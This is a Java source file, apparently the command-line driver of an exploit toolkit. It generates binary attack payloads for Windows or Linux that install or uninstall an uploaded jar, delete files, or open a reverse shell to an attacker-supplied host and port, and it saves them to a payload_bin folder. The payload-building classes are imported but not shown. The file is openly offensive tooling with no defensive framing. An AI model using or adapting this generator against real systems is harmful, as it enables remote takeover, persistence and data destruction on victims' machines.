
import java.io.BufferedOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import payload.GenInstallPayload;
import payload.GenPayload;
import payload.GenReversePayload;

public class genPayload {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		if(args.length<2){
			printUsage();
			return;
		}
		String OS=args[0];
		String Payload_Type=args[1];
		String fileName="";
		//
		if(OS.equals("win")) OS="Windows";
		else OS="Linux";
		if (Payload_Type.equals("inst"))Payload_Type="Install";
		else if(Payload_Type.equals("uninst")) Payload_Type="Uninstall";
		//
		byte[] payload=null;
		if(Payload_Type.equals("upload_inst")){
			fileName="payload_"+OS+"_upload_inst.bin";				
			byte[] payload_initapp=loadInitAppPayload("Install");
			payload=genWritePayload(OS,payload_initapp);
		}
		else if(Payload_Type.equals("upload_uninst")){
			fileName="payload_"+OS+"_upload_uninst.bin";
			byte[] payload_initapp=loadInitAppPayload("Uninstall");
			payload=genWritePayload(OS,payload_initapp);
		}
		else if(Payload_Type.equals("Install") ){
			fileName="payload_"+OS+"_inst.bin";
			payload=genInstPayload(OS);
		}
		else if(Payload_Type.equals("Uninstall") ){
			fileName="payload_"+OS+"_uninst.bin";
			payload=genInstPayload(OS);
		}
		else if(Payload_Type.equals("delete")){
			fileName="payload_"+OS+"_delete.bin";
			payload=genDeleteFilePayload(OS);
		}
		else if(Payload_Type.equals("upload_reverse")){
			fileName="payload_"+OS+"_upload_reverse.bin";
			byte[] payload_reverse=loadReversePayload();
			payload=genWritePayload(OS,payload_reverse);
		}
		else if(Payload_Type.equals("reverse")){
			fileName="payload_"+OS+"_reverse.bin";
			if(args.length!=4){
				System.out.println("\treverse payload:java genPayload [OS] [reverse] [host] [port]");
				return ;
			}
			payload=genReversePayload(OS,args[2],args[3]);
		}
		else{
			System.out.println("\tPayload_Type:upload_inst|inst|upload_uninst|uninst|delete|upload_reverse|reverse");
			return;
		}
		fileName = "./payload_bin/" + fileName;
		if(saveFile(fileName,payload)){
			System.out.println("save payload to file success!");
		}
		else{
			System.out.println("save payload fail!");
		}
	}
	
	
	private static void printUsage(){
		System.out.println("Usage:java genPayload [OS] [Payload_Type]");
		System.out.println("\tOS:win|linux");
		System.out.println("\tPayload_Type:upload_inst|inst|upload_uninst|uninst|delete|upload_reverse|reverse");
		System.out.println("\treverse payload:java genPayload [OS] [reverse] [host] [port]");
	}
	private static byte[] loadInitAppPayload(String Type){
		String Path="./payload_bin/inst.jar";
		if(Type.equals("Uninstall")) Path="./payload_bin/uninst.jar";
		return loadJarFileToBytes(Path);
	}
	private static byte[] loadReversePayload(){
		String Path="./payload_bin/reverse.jar";
		
		return loadJarFileToBytes(Path);	
	}
	private static byte[]loadJarFileToBytes(String Path){
		File file = new File(Path);  
        Long filelength = file.length();  
        byte[] filecontent = new byte[filelength.intValue()];  
        try {  
            FileInputStream in = new FileInputStream(file);  
            in.read(filecontent);  
            in.close();  
            return filecontent;
        } catch (FileNotFoundException e) {  
            e.printStackTrace();  
            return new byte[0];
        } catch (IOException e) {  
            e.printStackTrace();  
            return new byte[0];
        }  	
	}
	private static byte[] genInstPayload(String OS){
		try {
			byte[] payload=GenInstallPayload.Gen(OS);
			return payload;
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
	private static byte[] genWritePayload(String OS,byte[] context){
		try {
			byte[] payload=GenPayload.Gen(OS,context);
			return payload;
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
	private static byte[] genDeleteFilePayload(String OS){
		try {
			byte[] payload=GenPayload.DeleteFile(OS);
			return payload;
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
	private static byte[] genReversePayload(String OS,String Host,String Port){
		try {
			byte[] payload=GenReversePayload.Gen(OS,Host,Port);
			return payload;
			
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return null;
		}
	}
	private static boolean saveFile(String fileName,byte[] context){
	        try     
	        {      
	            DataOutputStream out=new DataOutputStream(      
	                                 new BufferedOutputStream(      
	                                 new FileOutputStream(fileName)));    
	            out.write(context);
	            out.close();      
	            
	            return true;
	        } catch (Exception e)      
	        {      
	            e.printStackTrace();
	            return false;
	        }      
	}

}
